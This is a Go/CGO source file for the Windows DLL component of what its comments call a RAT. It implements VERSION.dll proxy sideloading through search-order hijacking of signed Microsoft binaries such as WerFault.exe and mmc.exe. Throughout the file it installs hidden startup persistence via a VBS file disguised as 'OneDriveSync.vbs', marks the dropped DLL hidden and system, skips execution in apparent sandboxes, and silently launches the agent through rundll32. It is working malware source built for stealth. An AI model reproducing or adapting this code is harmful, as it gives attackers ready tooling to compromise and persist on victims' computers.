//go:build dll && windows

package main

/*
// Minimal Win32 typedefs — avoid #include <windows.h> which can conflict
// with Go CGO exports for VERSION.dll proxy functions.
#include <stdint.h>
typedef void*    HMODULE;
typedef uint16_t WCHAR;
typedef WCHAR*   LPCWSTR;
typedef unsigned long DWORD;
typedef int      BOOL;

#define GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS        0x00000004
#define GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT  0x00000002

// Import only the two functions we need, by declaration (no windows.h).
__declspec(dllimport) BOOL __stdcall GetModuleHandleExW(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE *phModule);
__declspec(dllimport) DWORD __stdcall GetModuleFileNameW(HMODULE hModule, WCHAR *lpFilename, DWORD nSize);

// getOwnModule returns the HMODULE of this DLL using the address of this
// C function, which lives inside the DLL's .text section.
static HMODULE getOwnModule() {
	HMODULE hm = 0;
	GetModuleHandleExW(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		(LPCWSTR)getOwnModule,
		&hm
	);
	return hm;
}

// getOwnPath writes this DLL's full path into buf and returns the length.
static int getOwnPath(WCHAR *buf, int bufLen) {
	HMODULE hm = getOwnModule();
	if (!hm) return 0;
	return (int)GetModuleFileNameW(hm, buf, (DWORD)bufLen);
}
*/
import "C"

import (
	"fmt"
	"io"
	mrand "math/rand"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ================================================================
// LOLBAS DLL SIDELOADING — VERSION.dll proxy via DLL search order
//
// Technique: DLL search order hijacking via VERSION.dll proxy.
// A signed Microsoft binary from System32 is copied to a user-writable
// directory alongside our malicious VERSION.dll. When the signed binary
// runs, Windows loads VERSION.dll from the application directory first
// (before System32), executing our payload.
//
// VERSION.dll is NOT in the Known DLLs list, so search order hijacking
// works reliably. Our DLL proxies all VERSION.dll exports to the real
// version.dll in System32 so the host binary functions normally.
//
// LOLBAS host binaries (all present on stock Windows 10/11):
//   - WerFault.exe          (Windows Error Reporting)
//   - CompMgmtLauncher.exe  (Computer Management)
//   - printui.exe           (Printer Configuration)
//   - mmc.exe               (Management Console)
//
// Flow:
//   Stage 1: Stager drops VERSION.dll + copies signed host binary
//            → executes host → DLL loaded via search order hijack
//   Stage 2: DLL installs persistence (startup VBS → rundll32)
//            → launches agent via rundll32.exe EntryPoint
//   Persistence: rundll32.exe <dll>,EntryPoint on startup
// ================================================================

const (
	// Persistent drop location — %APPDATA%\<subdir>\<name>.dll
	// These are replaced per build by obfus.py with randomized values.
	sideloadSubdir  = `Microsoft\Windows\Shell`
	sideloadDLLName = "ShellServiceHost.dll"
)

// LOLBAS host binaries — tried in order, first found wins.
// All are signed Microsoft binaries present on stock Windows 10/11.
var lolbasHosts = []string{
	`C:\Windows\System32\WerFault.exe`,
	`C:\Windows\System32\CompMgmtLauncher.exe`,
	`C:\Windows\System32\printui.exe`,
	`C:\Windows\System32\mmc.exe`,
}

func sideloadDir() string {
	return filepath.Join(os.Getenv("APPDATA"), sideloadSubdir)
}

func sideloadFullPath() string {
	return filepath.Join(sideloadDir(), sideloadDLLName)
}

// ================================================================
// VERSION.DLL PROXY — forward all exports to real System32\version.dll
//
// VERSION.dll exports 17 functions. We load the real DLL from System32
// at init time and forward all calls transparently. On amd64, the
// calling convention is unified (Microsoft x64) so Go //export
// functions with uintptr params work correctly as proxies.
// ================================================================

var (
	realVersionDLL                 syscall.Handle
	realGetFileVersionInfoA        uintptr
	realGetFileVersionInfoByHandle uintptr
	realGetFileVersionInfoExA      uintptr
	realGetFileVersionInfoExW      uintptr
	realGetFileVersionInfoSizeA    uintptr
	realGetFileVersionInfoSizeExA  uintptr
	realGetFileVersionInfoSizeExW  uintptr
	realGetFileVersionInfoSizeW    uintptr
	realGetFileVersionInfoW        uintptr
	realVerFindFileA               uintptr
	realVerFindFileW               uintptr
	realVerInstallFileA            uintptr
	realVerInstallFileW            uintptr
	realVerLanguageNameA           uintptr
	realVerLanguageNameW           uintptr
	realVerQueryValueA             uintptr
	realVerQueryValueW             uintptr
)

func initVersionProxy() {
	sysRoot := os.Getenv("SYSTEMROOT")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	p := filepath.Join(sysRoot, "System32", "version.dll")
	h, err := syscall.LoadLibrary(p)
	if err != nil {
		return
	}
	realVersionDLL = h
	realGetFileVersionInfoA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoA")
	realGetFileVersionInfoByHandle, _ = syscall.GetProcAddress(h, "GetFileVersionInfoByHandle")
	realGetFileVersionInfoExA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoExA")
	realGetFileVersionInfoExW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoExW")
	realGetFileVersionInfoSizeA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeA")
	realGetFileVersionInfoSizeExA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeExA")
	realGetFileVersionInfoSizeExW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeExW")
	realGetFileVersionInfoSizeW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeW")
	realGetFileVersionInfoW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoW")
	realVerFindFileA, _ = syscall.GetProcAddress(h, "VerFindFileA")
	realVerFindFileW, _ = syscall.GetProcAddress(h, "VerFindFileW")
	realVerInstallFileA, _ = syscall.GetProcAddress(h, "VerInstallFileA")
	realVerInstallFileW, _ = syscall.GetProcAddress(h, "VerInstallFileW")
	realVerLanguageNameA, _ = syscall.GetProcAddress(h, "VerLanguageNameA")
	realVerLanguageNameW, _ = syscall.GetProcAddress(h, "VerLanguageNameW")
	realVerQueryValueA, _ = syscall.GetProcAddress(h, "VerQueryValueA")
	realVerQueryValueW, _ = syscall.GetProcAddress(h, "VerQueryValueW")
}

// --- VERSION.dll export proxies (all 17 functions) ---

//export GetFileVersionInfoA
func GetFileVersionInfoA(a1, a2, a3, a4 uintptr) uintptr {
	if realGetFileVersionInfoA != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoA, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export GetFileVersionInfoByHandle
func GetFileVersionInfoByHandle(a1, a2, a3, a4, a5 uintptr) uintptr {
	if realGetFileVersionInfoByHandle != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoByHandle, a1, a2, a3, a4, a5)
		return r
	}
	return 0
}

//export GetFileVersionInfoExA
func GetFileVersionInfoExA(a1, a2, a3, a4, a5 uintptr) uintptr {
	if realGetFileVersionInfoExA != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoExA, a1, a2, a3, a4, a5)
		return r
	}
	return 0
}

//export GetFileVersionInfoExW
func GetFileVersionInfoExW(a1, a2, a3, a4, a5 uintptr) uintptr {
	if realGetFileVersionInfoExW != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoExW, a1, a2, a3, a4, a5)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeA
func GetFileVersionInfoSizeA(a1, a2 uintptr) uintptr {
	if realGetFileVersionInfoSizeA != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoSizeA, a1, a2)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeExA
func GetFileVersionInfoSizeExA(a1, a2, a3 uintptr) uintptr {
	if realGetFileVersionInfoSizeExA != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoSizeExA, a1, a2, a3)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeExW
func GetFileVersionInfoSizeExW(a1, a2, a3 uintptr) uintptr {
	if realGetFileVersionInfoSizeExW != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoSizeExW, a1, a2, a3)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeW
func GetFileVersionInfoSizeW(a1, a2 uintptr) uintptr {
	if realGetFileVersionInfoSizeW != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoSizeW, a1, a2)
		return r
	}
	return 0
}

//export GetFileVersionInfoW
func GetFileVersionInfoW(a1, a2, a3, a4 uintptr) uintptr {
	if realGetFileVersionInfoW != 0 {
		r, _, _ := syscall.SyscallN(realGetFileVersionInfoW, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export VerFindFileA
func VerFindFileA(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if realVerFindFileA != 0 {
		r, _, _ := syscall.SyscallN(realVerFindFileA, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

//export VerFindFileW
func VerFindFileW(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if realVerFindFileW != 0 {
		r, _, _ := syscall.SyscallN(realVerFindFileW, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

//export VerInstallFileA
func VerInstallFileA(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if realVerInstallFileA != 0 {
		r, _, _ := syscall.SyscallN(realVerInstallFileA, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

//export VerInstallFileW
func VerInstallFileW(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if realVerInstallFileW != 0 {
		r, _, _ := syscall.SyscallN(realVerInstallFileW, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

//export VerLanguageNameA
func VerLanguageNameA(a1, a2, a3 uintptr) uintptr {
	if realVerLanguageNameA != 0 {
		r, _, _ := syscall.SyscallN(realVerLanguageNameA, a1, a2, a3)
		return r
	}
	return 0
}

//export VerLanguageNameW
func VerLanguageNameW(a1, a2, a3 uintptr) uintptr {
	if realVerLanguageNameW != 0 {
		r, _, _ := syscall.SyscallN(realVerLanguageNameW, a1, a2, a3)
		return r
	}
	return 0
}

//export VerQueryValueA
func VerQueryValueA(a1, a2, a3, a4 uintptr) uintptr {
	if realVerQueryValueA != 0 {
		r, _, _ := syscall.SyscallN(realVerQueryValueA, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export VerQueryValueW
func VerQueryValueW(a1, a2, a3, a4 uintptr) uintptr {
	if realVerQueryValueW != 0 {
		r, _, _ := syscall.SyscallN(realVerQueryValueW, a1, a2, a3, a4)
		return r
	}
	return 0
}

// ================================================================
// SELF-PATH RESOLUTION (via CGO GetModuleFileName)
// ================================================================

func getSelfDLLPath() string {
	buf := make([]uint16, 512)
	n := int(C.getOwnPath((*C.wchar_t)(unsafe.Pointer(&buf[0])), 512))
	if n <= 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

// ================================================================
// AV EVASION HELPERS
// ================================================================

var (
	pSetFileAttributesW = kernel32.NewProc("SetFileAttributesW")
	pGetTickCount64     = kernel32.NewProc("GetTickCount64")
)

const (
	fileAttrHidden = 0x02
	fileAttrSystem = 0x04
)

// setHiddenSystem marks a file as hidden+system so it doesn't show
// in normal Explorer views or dir listings.
func setHiddenSystem(path string) {
	p, _ := syscall.UTF16PtrFromString(path)
	pSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), uintptr(fileAttrHidden|fileAttrSystem))
}

// sandboxSleep adds a random delay and checks if the system uptime
// is suspiciously low (fresh VM/sandbox spin-up).
func sandboxSleep() bool {
	time.Sleep(time.Duration(3+mrand.Intn(6)) * time.Second)
	uptime, _, _ := pGetTickCount64.Call()
	if uptime < uintptr(180_000) { // < 3 minutes
		return false // likely sandbox
	}
	return true
}

// ================================================================
// FILE COPY HELPER
// ================================================================

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// ================================================================
// LOLBAS HOST FINDER — locate signed binary on target system
// ================================================================

func findLOLBASHost() string {
	for _, path := range lolbasHosts {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}
	return ""
}

// ================================================================
// SIDELOAD INSTALLER — copies DLL + sets up LOLBAS persistence
// ================================================================

func performSideload() string {
	selfPath := getSelfDLLPath()
	if selfPath == "" {
		return "Sideload failed: cannot determine DLL path"
	}

	targetPath := sideloadFullPath()

	// Already at the target location — just ensure persistence is set
	if strings.EqualFold(selfPath, targetPath) {
		addSideloadPersistence(targetPath)
		return "Already sideloaded, persistence verified"
	}

	targetDir := sideloadDir()
	os.MkdirAll(targetDir, 0755)

	// Copy DLL to persistent drop location
	if err := copyFile(selfPath, targetPath); err != nil {
		return fmt.Sprintf("Sideload copy error: %v", err)
	}

	// Hide the DLL (hidden + system attributes)
	setHiddenSystem(targetPath)

	// Set up startup persistence: VBS → rundll32.exe <dll>,EntryPoint
	addSideloadPersistence(targetPath)

	return fmt.Sprintf("Sideloaded to %s + persistence installed (rundll32 startup)", targetPath)
}

func addSideloadPersistence(dllPath string) {
	// Create VBS stager in Startup folder that runs rundll32 with our DLL
	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	vbsPath := filepath.Join(startupDir, "OneDriveSync.vbs")

	// rundll32.exe loads our DLL and calls EntryPoint — blocks while agent runs
	vbsContent := fmt.Sprintf(
		"CreateObject(\"Wscript.Shell\").Run \"rundll32.exe \"\"%s\"\",EntryPoint\", 0, False\r\n",
		dllPath,
	)

	os.MkdirAll(startupDir, 0755)
	os.WriteFile(vbsPath, []byte(vbsContent), 0644)
}

func removeSideload() string {
	var results []string

	// Remove startup persistence
	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	os.Remove(filepath.Join(startupDir, "OneDriveSync.vbs"))
	results = append(results, "Startup persistence removed")

	// Remove sideloaded DLL
	targetPath := sideloadFullPath()
	if err := os.Remove(targetPath); err != nil && !os.IsNotExist(err) {
		results = append(results, fmt.Sprintf("DLL removal failed: %v", err))
	} else {
		results = append(results, "DLL removed")
	}

	return strings.Join(results, ", ")
}

// ================================================================
// HOOKS — wire DLL-specific commands/cleanup into shared main.go
// ================================================================

func dllCommandHandler(cmd string) (string, bool) {
	switch strings.ToLower(strings.TrimSpace(cmd)) {
	case "sideload":
		return performSideload(), true
	case "unsideload":
		return removeSideload(), true
	}
	return "", false
}

func dllPersistCleanup() {
	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	os.Remove(filepath.Join(startupDir, "OneDriveSync.vbs"))
	os.Remove(sideloadFullPath())
}

func dllOptionsText() string {
	return `
DLL SIDELOAD (LOLBAS)
  sideload       - Install DLL sideload persistence (rundll32 + startup)
  unsideload     - Remove sideloaded DLL + persistence`
}

// ================================================================
// DLL ENTRY POINTS
// ================================================================

//export EntryPoint
func EntryPoint() {
	// Called via rundll32.exe <dll>,EntryPoint (persistence or manual)
	if !sandboxSleep() {
		return
	}
	// Ensure persistence is installed
	performSideload()
	// Run RAT (blocking — rundll32 stays alive)
	runAgent()
}

func init() {
	// Set up VERSION.dll export proxying so host binary works normally
	initVersionProxy()

	// Register hooks into shared main.go — all DLL-specific strings
	// stay in this file and never appear in the EXE binary.
	extraPersistCleanup = dllPersistCleanup
	extraOptionsText = dllOptionsText
	extraCommandHandler = dllCommandHandler

	// Detect the host process
	exe, _ := os.Executable()
	exeName := strings.ToLower(filepath.Base(exe))

	if exeName != "rundll32.exe" {
		// Stage 1: loaded via LOLBAS DLL search order hijack
		// (e.g., WerFault.exe, mmc.exe, printui.exe copied alongside VERSION.dll)
		// Install persistence and launch agent via rundll32 (long-running).
		go func() {
			// Jitter before setup — avoid burst of activity
			time.Sleep(time.Duration(2+mrand.Intn(4)) * time.Second)

			selfPath := getSelfDLLPath()
			if selfPath == "" {
				return
			}

			// Copy DLL to persistent location
			targetPath := sideloadFullPath()
			targetDir := sideloadDir()
			os.MkdirAll(targetDir, 0755)

			if !strings.EqualFold(selfPath, targetPath) {
				copyFile(selfPath, targetPath)
				setHiddenSystem(targetPath)
			}

			// Set up startup persistence (VBS → rundll32)
			addSideloadPersistence(targetPath)

			// Launch agent via rundll32.exe (stays running via EntryPoint)
			verb, _ := syscall.UTF16PtrFromString("open")
			file, _ := syscall.UTF16PtrFromString("rundll32.exe")
			args, _ := syscall.UTF16PtrFromString(fmt.Sprintf(`"%s",EntryPoint`, targetPath))
			pShellExecuteW.Call(0,
				uintptr(unsafe.Pointer(verb)),
				uintptr(unsafe.Pointer(file)),
				uintptr(unsafe.Pointer(args)),
				0, 0) // SW_HIDE
		}()
	}
	// If rundll32: VERSION.dll proxy ready, wait for EntryPoint() call
}

// main is required by -buildmode=c-shared but never called directly.
func main() {}
